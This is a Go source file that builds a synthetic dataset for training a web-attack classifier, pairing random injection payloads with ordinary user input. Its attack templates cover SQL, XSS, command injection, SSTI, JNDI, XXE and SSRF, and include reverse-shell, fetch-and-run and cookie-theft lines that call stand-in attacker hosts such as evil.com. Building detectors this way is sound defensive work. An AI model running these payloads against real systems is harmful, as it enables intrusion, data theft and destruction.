// Package dataset generates labelled examples for training and testing the
// ML classifier: attack payloads from many families with random variations,
// and normal input of the kind real users type (searches, names, emails,
// reviews, passwords, addresses), including normal text that happens to
// contain words like "select", "union", "drop" or apostrophes, so the model
// can't take shortcuts.
//
// The data is synthetic. That keeps the project self-contained and
// reproducible (same seed, same data), and the evaluation report says so.
package dataset

import (
	"fmt"
	"math/rand"
	"net/url"
	"strings"
)

type Example struct {
	Text   string
	Attack bool
	Family string
}

type gen struct{ r *rand.Rand }

func (g gen) pick(s ...string) string { return s[g.r.Intn(len(s))] }
func (g gen) n(lo, hi int) int        { return lo + g.r.Intn(hi-lo+1) }
func (g gen) maybe(p float64) bool    { return g.r.Float64() < p }

var (
	tables  = []string{"users", "accounts", "admin", "customers", "members", "orders", "products", "employees", "login", "credentials", "staff", "payments"}
	columns = []string{"password", "username", "email", "pass", "pwd", "user", "id", "credit_card", "token", "secret", "salary", "hash"}
	hosts   = []string{"evil.com", "attacker.net", "10.0.0.5", "x.oast.me", "1.2.3.4", "badhost.io", "burpcollaborator.net"}
)

func (g gen) q() string { return g.pick("'", "\"", "", "')", "\")", "'))") }
func (g gen) comment() string {
	return g.pick("--", "-- -", "#", "/*", "--+", ";--", "")
}
func (g gen) num() string { return fmt.Sprint(g.n(0, 9999)) }
func (g gen) sp() string  { return g.pick(" ", " ", " ", "  ", "/**/", "+", "%20", "\t") }

// Attack families. Each returns one random payload.
var attacks = map[string]func(g gen) string{
	"sqli-tautology": func(g gen) string {
		a := g.pick("1", "a", "x", "abc", g.num())
		return g.pick("", g.num(), "admin", "test", g.pick(products...), g.pick(products...)+"%") + g.q() + g.sp() + g.pick("or", "OR", "Or", "||", "and", "AND", "&&") + g.sp() +
			g.pick(a+"="+a, "'"+a+"'='"+a, "\""+a+"\"=\""+a, "1=1", "true", "2>1", a+" like '"+a, "not false", "1") + g.sp() + g.comment()
	},
	"sqli-union": func(g gen) string {
		cols := make([]string, g.n(1, 8))
		for i := range cols {
			cols[i] = g.pick("null", "NULL", g.num(), g.pick(columns...), "@@version", "user()", "database()", "version()", "'a'")
		}
		return g.pick("", g.num(), "x", "-1", g.pick(products...), g.pick(products...)+"%") + g.q() + g.sp() + g.pick("union", "UNION", "UnIoN") + g.sp() + g.pick("", "all"+g.sp(), "ALL"+g.sp()) +
			g.pick("select", "SELECT", "SeLeCt") + g.sp() + strings.Join(cols, ",") + g.pick("", g.sp()+"from"+g.sp()+g.pick(tables...)) + g.sp() + g.comment()
	},
	"sqli-stacked": func(g gen) string {
		return g.pick("1", "x", "") + g.q() + g.pick(";", "; ") + g.pick("drop table "+g.pick(tables...), "DROP TABLE "+g.pick(tables...),
			"delete from "+g.pick(tables...), "insert into "+g.pick(tables...)+" values(1,'x')", "update "+g.pick(tables...)+" set "+g.pick(columns...)+"='x'",
			"exec xp_cmdshell 'dir'", "shutdown", "truncate table "+g.pick(tables...)) + g.sp() + g.comment()
	},
	"sqli-time": func(g gen) string {
		return g.pick("1", "x", "", g.pick(products...)+"%") + g.q() + g.sp() + g.pick("and", "or", "AND", "||") + g.sp() + g.pick("sleep("+fmt.Sprint(g.n(1, 15))+")",
			"SLEEP("+fmt.Sprint(g.n(1, 15))+")", "benchmark(5000000,md5(1))", "pg_sleep("+fmt.Sprint(g.n(1, 10))+")", "(select * from (select(sleep(5)))a)",
			"if(1=1,sleep(5),0)") + g.sp() + g.comment()
	},
	"sqli-waitfor": func(g gen) string {
		return g.pick("1", "") + g.q() + g.pick(";", "; ") + "waitfor delay '0:0:" + fmt.Sprint(g.n(1, 9)) + "'" + g.comment()
	},
	"sqli-error": func(g gen) string {
		return g.pick("1", "x", "") + g.q() + g.sp() + g.pick("and", "or", "AND") + g.sp() + g.pick(
			"extractvalue(1,concat(0x7e,(select "+g.pick("user()", "version()", "database()", g.pick(columns...)+" from "+g.pick(tables...)+" limit 1")+")))",
			"updatexml(1,concat(0x7e,(select "+g.pick("user()", "version()", "@@version")+")),1)",
			"(select 1 from(select count(*),concat((select "+g.pick("user()", "database()")+"),floor(rand(0)*2))x from information_schema.tables group by x)a)",
			"cast((select "+g.pick(columns...)+" from "+g.pick(tables...)+" limit 1) as int)",
			"convert(int,(select top 1 "+g.pick(columns...)+" from "+g.pick(tables...)+"))") + g.sp() + g.comment()
	},
	"sqli-blind": func(g gen) string {
		return g.pick("1", "x", "") + g.q() + g.sp() + g.pick("and", "AND", "or") + g.sp() + g.pick(
			"substring(@@version,1,1)='"+fmt.Sprint(g.n(4, 8)),
			"ascii(substr((select "+g.pick(columns...)+" from "+g.pick(tables...)+" limit 1),"+fmt.Sprint(g.n(1, 20))+",1))>"+fmt.Sprint(g.n(30, 120)),
			"length(database())="+fmt.Sprint(g.n(1, 12)),
			"(select count(*) from "+g.pick(tables...)+")>0",
			"exists(select * from "+g.pick(tables...)+")",
			"1=(select 1 from dual)") + g.sp() + g.comment()
	},
	"sqli-orderby": func(g gen) string {
		return g.pick("1", "x", "") + g.q() + g.sp() + g.pick("order by ", "ORDER BY ", "group by ") + fmt.Sprint(g.n(1, 30)) + g.sp() + g.comment()
	},
	"sqli-schema": func(g gen) string {
		return g.pick("", "1"+g.q()+" union select ") + g.pick("table_name from information_schema.tables", "column_name from information_schema.columns",
			"name from sqlite_master", "* from pg_catalog.pg_tables", "user,password from mysql.user", "name from sysobjects where xtype='u'") + g.sp() + g.comment()
	},
	// What sqlmap sends: a normal value, the quote (often after a LIKE
	// wildcard %), a condition, and a suffix that repairs the query.
	"sqli-sqlmap": func(g gen) string {
		tag := func() string {
			const l = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
			b := make([]byte, 4)
			for i := range b {
				b[i] = l[g.r.Intn(len(l))]
			}
			return string(b)
		}
		n := g.num()
		cond := g.pick(n+"="+n, n+" BETWEEN "+n+" AND "+n, "CASE WHEN "+n+"="+n+" THEN "+n+" ELSE JSON(CHAR("+fmt.Sprint(g.n(65, 90))+","+fmt.Sprint(g.n(65, 90))+","+fmt.Sprint(g.n(65, 90))+")) END",
			"(SELECT "+n+" FROM (SELECT(SLEEP(5)))"+tag()+")", n+"=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))", "ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM "+g.pick(tables...)+"),1,1))>"+fmt.Sprint(g.n(30, 60)),
			"EXISTS(SELECT * FROM "+g.pick(tables...)+")", "1=CAST(0x"+fmt.Sprintf("%x", g.n(1000, 99999))+" AS INT)", "UPPER(HEX(RANDOMBLOB("+fmt.Sprint(g.n(100000, 500000000))+")))")
		suffix := g.pick("-- "+tag(), "#", " AND '"+tag()+"%'='"+tag(), " AND '"+tag()+"'='"+tag(), " AND \""+tag()+"\"=\""+tag(), "-- -", "")
		return g.pick(products...) + g.pick("%'", "'", "')", "%')", "\"", "") + " " + g.pick("AND", "OR", "and", "or") + " " + cond + suffix
	},
	"nosqli": func(g gen) string {
		return g.pick(`{"$ne": null}`, `{"$gt": ""}`, `[$ne]=1`, `{"$regex": ".*"}`, `' || '1'=='1`, `"; return true; var x="`,
			`{"$where": "sleep(1000)"}`, `admin' && this.password.match(/.*/)//`, `{"username": {"$in": ["admin","root"]}}`, `true, $where: '1 == 1'`)
	},
	"xss-script": func(g gen) string {
		return g.pick("", "\">", "'>", "</title>", "</textarea>") + g.pick("<script>", "<SCRIPT>", "<ScRiPt>", "<script type=text/javascript>", "<script src=//"+g.pick(hosts...)+"/x.js>") +
			g.pick("alert(1)", "alert(document.cookie)", "prompt(1)", "confirm`1`", "fetch('//"+g.pick(hosts...)+"/?c='+document.cookie)", "document.location='http://"+g.pick(hosts...)+"/'+document.cookie", "eval(atob('YWxlcnQoMSk='))", "") + "</script>"
	},
	"xss-event": func(g gen) string {
		tag := g.pick("img src=x", "svg", "body", "video src=x", "audio src=x", "details open", "input autofocus", "iframe", "marquee", "div", "a href=#", "select autofocus")
		ev := g.pick("onerror", "onload", "onfocus", "onmouseover", "ontoggle", "onclick", "onanimationstart", "onpointerover", "onbegin")
		js := g.pick("alert(1)", "alert`1`", "prompt(document.domain)", "confirm(1)", "eval(name)", "location='//"+g.pick(hosts...)+"'", "top['al'+'ert'](1)", "fetch('//"+g.pick(hosts...)+"')")
		return g.pick("", "\">", "'>", "\" ") + "<" + tag + g.pick(" ", "/", "\n") + ev + "=" + g.pick("", "\"", "'") + js + g.pick("", "\"", "'") + ">"
	},
	"xss-uri": func(g gen) string {
		return g.pick("<a href=\"", "<iframe src=\"", "", "<form action=\"", "<object data=\"") + g.pick("javascript:", "JaVaScRiPt:", "javascript&colon;", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "vbscript:") +
			g.pick("alert(1)", "alert(document.cookie)", "", "prompt(1)") + g.pick("\">x</a>", "\">", "")
	},
	"xss-template": func(g gen) string {
		return g.pick("{{constructor.constructor('alert(1)')()}}", "{{$on.constructor('alert(1)')()}}", "<svg><animate onbegin=alert(1) attributeName=x>",
			"<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>", "\"-alert(1)-\"", "';alert(String.fromCharCode(88,83,83))//", "<img src=\"x\" onerror=\"&#97;lert(1)\">")
	},
	"traversal": func(g gen) string {
		up := g.pick("../", "..\\", "..%2f", "..%5c", "....//", "%2e%2e/", "%2e%2e%2f", "..%252f", "..;/")
		return g.pick("", "/var/www/", "files/", "download?file=", "images/") + strings.Repeat(up, g.n(2, 8)) + g.pick("etc/passwd", "etc/shadow", "etc/hosts", "windows/win.ini",
			"boot.ini", "proc/self/environ", "var/log/apache2/access.log", ".env", "config/database.yml", "web.config", "WEB-INF/web.xml") + g.pick("", "%00", "%00.png", "\x00.jpg")
	},
	"file-uri": func(g gen) string {
		return g.pick("file:///etc/passwd", "file:///c:/windows/win.ini", "php://filter/convert.base64-encode/resource=index.php", "expect://id", "php://input", "zip://shell.jpg#shell.php", "/proc/self/cmdline")
	},
	"cmdi": func(g gen) string {
		sep := g.pick(";", "|", "||", "&&", "&", "\n", "`", "$(", "%0a", "%3b")
		cmd := g.pick("cat /etc/passwd", "id", "whoami", "uname -a", "ls -la", "pwd", "ping -c 3 "+g.pick(hosts...), "curl http://"+g.pick(hosts...)+"/sh | sh",
			"wget http://"+g.pick(hosts...)+"/x -O /tmp/x", "nc -e /bin/sh "+g.pick(hosts...)+" 4444", "bash -i >& /dev/tcp/"+g.pick(hosts...)+"/4444 0>&1",
			"nslookup "+g.pick(hosts...), "sleep 10", "rm -rf /", "type c:\\windows\\win.ini", "powershell -enc SQBFAFgA", "python -c 'import os;os.system(\"id\")'")
		end := ""
		if sep == "`" {
			end = "`"
		} else if sep == "$(" {
			end = ")"
		}
		return g.pick("", "127.0.0.1", "test", "file.txt", g.num()) + g.pick("", " ") + sep + g.pick("", " ") + cmd + end
	},
	"ssti": func(g gen) string {
		return g.pick("{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{config}}", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
			"{{''.__class__.__mro__[1].__subclasses__()}}", "${T(java.lang.Runtime).getRuntime().exec('id')}", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
			"{% import os %}{{os.system('id')}}", "*{7*7}", "@(7*7)", "{{self.__init__.__globals__}}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}")
	},
	"jndi": func(g gen) string {
		return g.pick("${jndi:ldap://", "${jndi:rmi://", "${jndi:dns://", "${${lower:j}ndi:ldap://", "${${::-j}${::-n}${::-d}${::-i}:ldap://", "${jndi:${lower:l}${lower:d}ap://") + g.pick(hosts...) + "/" + g.pick("a", "x", "Exploit", g.num()) + "}"
	},
	"xxe": func(g gen) string {
		return g.pick(`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
			`<!DOCTYPE x [<!ENTITY % ext SYSTEM "http://`+g.pick(hosts...)+`/x.dtd"> %ext;]>`,
			`<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">`, `<!DOCTYPE r [<!ELEMENT r ANY><!ENTITY sp SYSTEM "http://`+g.pick(hosts...)+`/">]><r>&sp;</r>`)
	},
	"ldap": func(g gen) string {
		return g.pick("*)(uid=*))(|(uid=*", "*)(|(objectclass=*)", "admin)(&)", "*)(&(objectClass=user)", "x)(|(cn=*))", "*()|&'")
	},
	"ssrf": func(g gen) string {
		return g.pick("http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/computeMetadata/v1/", "http://localhost:"+fmt.Sprint(g.pick("22", "6379", "8080", "2375", "9200")),
			"http://127.0.0.1:"+g.pick("22", "6379", "3306", "11211")+"/", "gopher://127.0.0.1:6379/_FLUSHALL", "dict://localhost:11211/stat", "http://[::1]/admin", "http://0x7f000001/", "http://2130706433/", "file:///etc/passwd")
	},
	"crlf": func(g gen) string {
		return g.pick("%0d%0aSet-Cookie:session=evil", "\r\nLocation: http://"+g.pick(hosts...), "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK", "%0aX-Injected: 1")
	},
}

// Normal input families.
var (
	products = []string{"apple juice", "banana", "orange juice", "melon bike", "green smoothie", "carrot juice", "eggfruit", "lemon", "strawberry", "t-shirt", "hoodie",
		"sticker", "coaster", "mug", "water bottle", "notebook", "usb cable", "laptop stand", "headphones", "phone case", "coffee beans", "green tea", "chocolate", "rice", "olive oil"}
	firsts = []string{"Ali", "Sara", "Omar", "Noor", "Hassan", "Zainab", "Mohammed", "Fatima", "John", "Mary", "Liam", "Emma", "Sean", "Aoife", "D'Angelo", "Chloé", "Jean-Luc", "Ana María", "O'Neil"}
	lasts  = []string{"Al-Hashimi", "Kareem", "Smith", "O'Brien", "Müller", "García", "Nguyen", "Kim", "D'Souza", "van der Berg", "Abdullah", "MacDonald", "Johnson-Lee"}
	words  = []string{"select", "union", "drop", "table", "order", "from", "where", "and", "or", "like", "script", "alert", "cat", "id", "ls", "update", "delete", "insert",
		"exec", "sleep", "join", "group", "having", "null", "true", "false", "version", "user", "admin", "password", "file", "path", "echo", "ping", "system", "root", "config"}
	sentences = []string{"Great product, would buy again!", "Arrived late but works fine.", "I'd give it 5/5 - excellent quality & fast delivery.", "Not bad :) my kids love it",
		"Does this come in blue?", "Can I return it after 30 days?", "The size runs small, order one size up.", "It's ok... a bit expensive for what it is.",
		"Please select a different size, the M is out of stock.", "We met at Union Square at 5pm.", "Drop me an email when it's back in stock!", "Update: still working after 2 years.",
		"Is there a discount for orders over $100?", "My cat loves this toy!!", "Ping me when you're free", "Order #4417 hasn't arrived yet, where is it?",
		"Script writing course, beginner level", "Set a price alert for this item", "The table and chairs were delivered today.", "Where can I find the user manual?",
		"I'm not sure if 2 > 1 applies here", "Use code SAVE10 at checkout", "He said: \"it's the best one\"", "Works with Windows & macOS (not Linux)", "Rock 'n' roll t-shirt, size L",
		"Delete my account please", "How do I update my address?", "Insert the card and wait 5 seconds", "Join our newsletter for 10% off", "Version 2.0 is much better than 1.5"}
)

var normals = map[string]func(g gen) string{
	"search": func(g gen) string {
		return g.pick(products...) + g.pick("", "", " "+g.pick(products...), " 1l", " 500ml", " x2", " cheap", " best", " organic", " sale")
	},
	"words": func(g gen) string {
		n := g.n(1, 5)
		ws := make([]string, n)
		for i := range ws {
			ws[i] = g.pick(words...)
		}
		return strings.Join(ws, g.pick(" ", " ", "-", "_", ", "))
	},
	"name": func(g gen) string { return g.pick(firsts...) + " " + g.pick(lasts...) },
	"email": func(g gen) string {
		return strings.ToLower(strings.ReplaceAll(g.pick(firsts...), " ", "")) + g.pick(".", "_", "", "+shop") + strings.ToLower(strings.ReplaceAll(g.pick(lasts...), " ", "")) + g.pick("", g.num()) + "@" + g.pick("gmail.com", "uni.edu.iq", "company.com", "outlook.com", "juice-sh.op")
	},
	"phone": func(g gen) string {
		return g.pick("+964 7", "07", "+1 (555) ", "+44 20 ") + fmt.Sprintf("%d %03d %04d", g.n(70, 79), g.n(0, 999), g.n(0, 9999))
	},
	"sentence": func(g gen) string { return g.pick(sentences...) },
	"review": func(g gen) string {
		return g.pick(sentences...) + " " + g.pick(sentences...)
	},
	"password": func(g gen) string {
		chars := "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#$%^&*()-_=+'\";:,.?/"
		b := make([]byte, g.n(8, 20))
		for i := range b {
			b[i] = chars[g.r.Intn(len(chars))]
		}
		return g.pick(string(b), g.pick(firsts...)+"#"+fmt.Sprint(g.n(1990, 2030)), "P@ssw0rd!"+g.num(), g.pick(words...)+g.num()+"!")
	},
	"address": func(g gen) string {
		return fmt.Sprintf("%d %s %s, %s", g.n(1, 999), g.pick("Al-Rasheed", "Palestine", "Main", "Oak", "Haifa", "Karrada", "King's"), g.pick("St", "Street", "Rd", "Ave"), g.pick("Baghdad", "Erbil", "Basra", "London", "Dublin"))
	},
	"number": func(g gen) string {
		return g.pick(g.num(), fmt.Sprintf("%d.%02d", g.n(0, 999), g.n(0, 99)), fmt.Sprintf("$%d.99", g.n(1, 500)), fmt.Sprintf("%d%%", g.n(1, 100)), fmt.Sprintf("-%d", g.n(1, 50)))
	},
	"date": func(g gen) string {
		return g.pick(fmt.Sprintf("2026-%02d-%02d", g.n(1, 12), g.n(1, 28)), fmt.Sprintf("%02d/%02d/2026", g.n(1, 28), g.n(1, 12)), fmt.Sprintf("%02d:%02d", g.n(0, 23), g.n(0, 59)), "next Monday", "tomorrow 5pm")
	},
	"url": func(g gen) string {
		return g.pick("https://", "http://") + g.pick("example.com", "shop.juice-sh.op", "github.com/sentinel", "en.wikipedia.org/wiki/Baghdad", "maps.google.com") +
			g.pick("", "/", "/page?id="+g.num(), "/search?q="+url.QueryEscape(g.pick(products...)), "/a/b/c.html", "#section-2")
	},
	"filename": func(g gen) string {
		return g.pick("report", "photo", "invoice", "cv", "scan", "notes", "budget") + g.pick("-2026", "_final", "(1)", " copy", "") + g.pick(".pdf", ".png", ".jpg", ".docx", ".xlsx", ".txt")
	},
	"code-ish": func(g gen) string {
		return g.pick("C++ for beginners", "C# in depth", "Node.js & Express", "2+2=4", "a*b = c", "x > 5 and y < 3", "50% off!", "#1 best seller", "item (2 of 3)", "[draft] notes",
			"**bold** and _italic_", "key=value", "user@host", "~/Documents", "a/b testing", "50/50 chance", "if you're happy & you know it", "5 o'clock", "rock'n'roll", "AT&T")
	},
	"id": func(g gen) string {
		const hex = "0123456789abcdef"
		n := g.n(6, 32)
		s := make([]byte, n)
		for i := range s {
			s[i] = hex[g.r.Intn(16)]
		}
		return g.pick(string(s), "ORD-"+g.num(), "SKU"+g.num(), fmt.Sprint(g.n(1, 50)), g.pick(firsts...)+g.num())
	},
	"json-text": func(g gen) string {
		return g.pick("red", "blue", "#ff0000", "rgb(0,128,255)", "en-US", "ar-IQ", "Asia/Baghdad", "true", "false", "null", "dark", "light", "medium", "standard shipping", "express")
	},
	"token": func(g gen) string {
		const b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
		rnd := func(n int) string {
			s := make([]byte, n)
			for i := range s {
				s[i] = b64[g.r.Intn(len(b64))]
			}
			return string(s)
		}
		return g.pick("eyJhbGciOiJIUzI1NiJ9."+rnd(g.n(40, 120))+"."+rnd(43), rnd(g.n(16, 64)),
			fmt.Sprintf("%08x-%04x-4%03x-a%03x-%012x", g.r.Uint32(), g.n(0, 65535), g.n(0, 4095), g.n(0, 4095), g.r.Int63n(1<<48)), "P"+rnd(6), rnd(20)+"==")
	},
	"graphql": func(g gen) string {
		field := func() string {
			return g.pick("id", "name", "title", "price", "sku", "url", "image", "description", "brandId", "__typename", "quantity", "slug", "path", "currency", "value", "createdAt", "status", "email")
		}
		fields := func(n int) string {
			var b strings.Builder
			for i := 0; i < n; i++ {
				if i > 0 {
					b.WriteString(" ")
				}
				b.WriteString(field())
			}
			return b.String()
		}
		obj := g.pick("products", "product", "cart", "user", "order", "findContent", "findURL", "category", "search", "collection", "images", "prices", "variants", "reviews")
		arg := g.pick(`id: $id`, `sku: "`+g.pick("SKU", "P", "")+g.num()+`"`, `first: `+fmt.Sprint(g.n(1, 100)), `brand: "`+g.pick("shop", "acme", "flowers", "berries")+`"`,
			`environment: "production"`, `locale: "en-us"`, `skus: $skus`, `path: "/`+g.pick("green", "sale", "new", "men", "women")+`"`, `filter: {status: ACTIVE}`, `after: "`+g.num()+`"`)
		op := g.pick("query", "query", "query", "mutation")
		name := g.pick("ProductQuery", "CategoryDataQuery", "GetCart", "Search", "plpProductsData", "UpdateCart", "Login", "CourseBySlugQuery", "")
		vars := g.pick("", "($id: ID!)", "($skus: [String!])", "($brand: String!, $environment: String!)", "($first: Int)")
		inner := fields(g.n(1, 5))
		if g.maybe(0.6) {
			inner += " " + g.pick("image", "price", "retail", "brand", "items", "edges", "node", "pageInfo") + " { " + fields(g.n(1, 4)) + " __typename }"
		}
		body := obj + "(" + arg + ") { " + inner + " }"
		if g.maybe(0.3) {
			body = obj + " { " + inner + " }"
		}
		full := op + " " + name + vars + " { " + body + " }"
		return g.pick(full, full, "{ "+body+" }", body+" __typename } __typename }",
			`{"`+g.pick("targeting", "skus", "id", "brand")+`":`+g.pick("[]", `["`+g.num()+`"]`, `"`+g.num()+`"`, "null", "{}")+`}`,
			"fragment "+g.pick("ProductFields", "Price", "Img")+" on "+g.pick("Product", "Price", "Image")+" { "+fields(g.n(1, 4))+" }")
	},
	"telemetry": func(g gen) string {
		code := func() string {
			const a = "0123456789abcdefghijklmnopqrstuvwxyz"
			s := make([]byte, g.n(1, 5))
			for i := range s {
				s[i] = a[g.r.Intn(len(a))]
			}
			return string(s)
		}
		return g.pick(
			code()+","+code()+","+code()+","+fmt.Sprint(g.n(1, 9))+","+fmt.Sprint(g.n(1, 9))+"*"+fmt.Sprint(g.n(1, 20)),
			g.pick("div", "section", "main", "ul")+"#"+g.pick("app", "root", "main")+" * "+g.pick("div", "section", "h2", "li")+"._"+g.pick("carousel", "card", "grid", "hero")+"-context_"+code()+"_"+fmt.Sprint(g.n(1, 2000)),
			`{"event_category":"`+g.pick("CHECKOUT", "CART", "PDP", "SEARCH")+`","event_name":"`+g.pick("SECTION VIEW:PAYMENT", "ADD TO CART", "VIEW ITEM")+`","logged_in":"`+g.pick("TRUE", "FALSE")+`"}`,
			`"`+fmt.Sprint(g.n(1, 999))+`":{"load":`+fmt.Sprint(g.n(0, 1))+`,"wait":`+fmt.Sprint(g.n(0, 9))+`,"tid":`+fmt.Sprint(g.n(1000, 30000))+`,"executed":0}`,
			"~(fbevents*3a~(end*3a"+g.pick("estPageViewProcessing", "init", "track")+"~'"+code()+"~start*3a"+g.pick("estPageViewProcessing", "init")+"~'"+code()+"))",
			`{"v":[0,1],"d":{"ty":"Browser","ac":"`+fmt.Sprint(g.n(100000, 9999999))+`","ap":"`+fmt.Sprint(g.n(100000, 9999999))+`"}}`,
		)
	},
	"socketio": func(g gen) string {
		return g.pick("polling", "websocket", "4", "40", "2", "3", `42["notification received","`+g.pick(products...)+`"]`, `40{"sid":"`+fmt.Sprint(g.r.Int63())+`"}`, "1:EIO=4", "ok")
	},
	"payment": func(g gen) string {
		return g.pick(fmt.Sprintf("4%015d", g.r.Int63n(1e15)), fmt.Sprintf("%02d/%02d", g.n(1, 12), g.n(26, 32)), fmt.Sprint(g.n(100, 999)), "VISA", "Mastercard", fmt.Sprintf("%d", g.n(1, 12)))
	},
	"hard-negative": func(g gen) string {
		return g.pick("Order 1 of 2", "size 1-2 years", "(1) item in basket", "-- see you soon", "Price: 10-20$", "1 = one, 2 = two", "Q&A: ask anything", "A/B/C options",
			"I can't login -- please help", "Union Bank of Iraq", "Select Comfort mattress", "drop-down menu broken", "where is my order?", "John's special order",
			"<3 love it", "5* service", "smile :-)", "item #2; item #3", "50% cotton / 50% polyester", "from 9 to 5", "1' tall plant", "the OR gate in logic class",
			"script.pdf", "alert me when it's back", "sleep mask for travel", "cat /dog toys", "admin assistant job", "user guide v1.2", "table tennis set", "passwd is short for password",
			"(see attached)", "call me (after 5pm)", "f(x) = 2x + 1", "great :) thanks (again)", "a > b and b > c", "price (incl. VAT)", "[1] first note", "{name} placeholder",
			"size: M (fits L)", "3 x (2 + 4) = 18", "<- back", "-> next", "John (HR) said so", "concat two strings in Excel", "extract value from report", "select user from the list")
	},
	"tech-prose": func(g gen) string {
		lang := g.pick("JavaScript", "Python", "SQL", "PHP", "Java", "HTML", "CSS", "Bash", "Go", "C#", "XML", "JSON", "Linux", "Windows")
		topic := g.pick("Basics", "Introduction", "Functions", "Loops", "Variables", "Arrays", "Objects", "Classes", "Errors", "Strings", "Dates", "Files", "Security", "Tips")
		lo := g.n(0, 50)
		hi := lo + g.n(1, 500)
		param := g.pick("hl", "lang", "page", "sort", "q", "ref", "utm_source", "id", "size", "color")
		val := g.pick("fr", "en", "ar", "2", "asc", "desc", "newsletter", "42", "M", "red")
		return g.pick(
			lang+": "+topic+" of "+lang,
			lang+" "+topic+" for beginners",
			"Learn "+lang+" "+topic+" in "+fmt.Sprint(g.n(2, 30))+" minutes",
			lang+" "+strings.ToLower(topic)+" cheat sheet ("+fmt.Sprint(g.n(2020, 2026))+")",
			"pick a random number between "+fmt.Sprint(lo)+" and "+fmt.Sprint(hi),
			"I want "+g.pick("a size", "a number", "an age", "a price", "a date")+" between "+fmt.Sprint(lo)+" and "+fmt.Sprint(hi)+", please",
			"show results between "+fmt.Sprint(lo)+" and "+fmt.Sprint(hi)+" only",
			"ages "+fmt.Sprint(lo)+" to "+fmt.Sprint(hi)+" or older",
			"I will include the parameter \""+param+"="+val+"\" in the link",
			"add ?"+param+"="+val+" to the address to change it",
			"How do I "+g.pick("select", "update", "delete", "insert", "drop", "join")+" "+g.pick("rows", "a column", "duplicates", "an item", "my account", "two tables")+" in "+lang+"?",
			"the "+g.pick("script", "alert", "prompt", "confirm", "eval", "document")+" "+g.pick("button", "dialog", "tag", "box", "page", "function")+" in "+lang+" does not work",
			"What does "+g.pick("<br>", "&&", "||", "!=", "==", "->", "=>", "::")+" mean in "+lang+"?",
		)
	},
	"parens": func(g gen) string {
		return g.pick(products...) + " (" + g.pick("2 pack", "new", "large", "x"+fmt.Sprint(g.n(1, 9)), g.num()+"g", "gift") + ")" + g.pick("", " - "+g.pick(sentences...))
	},
	"user-agent": func(g gen) string {
		v := fmt.Sprint(g.n(100, 131))
		return g.pick("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+v+".0.0.0 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."+fmt.Sprint(g.n(0, 6))+" Safari/605.1.15",
			"Mozilla/5.0 (X11; Linux x86_64; rv:"+v+".0) Gecko/20100101 Firefox/"+v+".0",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 17_"+fmt.Sprint(g.n(0, 5))+" like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
			"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+v+".0.0.0 Mobile Safari/537.36",
			"curl/8."+fmt.Sprint(g.n(0, 9))+".0", "okhttp/4.12.0", "python-requests/2.3"+fmt.Sprint(g.n(0, 2))+".0", "Go-http-client/1.1", "PostmanRuntime/7.39.0", "Dalvik/2.1.0 (Linux; U; Android 13)")
	},
	"header-value": func(g gen) string {
		return g.pick("gzip, deflate, br", "max-age=0", "no-cache", "keep-alive", "same-origin", "cors", "navigate", "document", "?1", "1",
			"W/\""+fmt.Sprintf("%x", g.r.Int63())+"\"", "\"33a64df551425fcc55e4d42a148795d9f25f89d4\"", "bytes=0-1023", "XMLHttpRequest", "en-US,en;q=0.9,ar;q=0.8",
			"application/json, text/plain, */*", "v"+fmt.Sprint(g.n(1, 3)), "2024-06-01", "Bearer", "tenant-"+g.num(), "trace-"+fmt.Sprintf("%016x", g.r.Int63()),
			"https://"+g.pick("shop.juice-sh.op", "example.com", "localhost:8080")+g.pick("/", "/#/search?q="+g.pick(products...), "/#/basket", "/#/login"))
	},
	"cookie-value": func(g gen) string {
		return g.pick("en", "ar", "dismiss", "dismissed", "true", "false", "light", "dark", fmt.Sprint(g.n(1, 99)),
			fmt.Sprintf("%x", g.r.Int63())+fmt.Sprintf("%x", g.r.Int63()), "s%3A"+fmt.Sprintf("%x", g.r.Int63())+".abcDEF123", "GA1.2."+fmt.Sprint(g.r.Int31())+"."+fmt.Sprint(g.r.Int31()))
	},
	"arabic": func(g gen) string {
		return g.pick("عصير تفاح", "شكراً جزيلاً", "متى يوصل الطلب؟", "منتج ممتاز", "بغداد - الكرادة", "سيف علاء", "أريد إلغاء الطلب", "هل يوجد خصم؟")
	},
}

// Generate returns n attacks and n normal examples, shuffled, from seed.
func Generate(n int, seed int64) []Example {
	g := gen{rand.New(rand.NewSource(seed))}
	aKeys, nKeys := keys(attacks), keys(normals)
	out := make([]Example, 0, 2*n)
	for i := 0; i < n; i++ {
		f := aKeys[g.r.Intn(len(aKeys))]
		a := attacks[f](g)
		// Some attacks arrive inside ordinary text (a review, a long
		// comment): learn to spot them there too.
		if g.maybe(0.15) {
			a = g.pick(sentences...) + " " + a + g.pick("", " "+g.pick(sentences...))
		}
		out = append(out, Example{a, true, f})
		f = nKeys[g.r.Intn(len(nKeys))]
		out = append(out, Example{normals[f](g), false, f})
	}
	g.r.Shuffle(len(out), func(i, j int) { out[i], out[j] = out[j], out[i] })
	return out
}

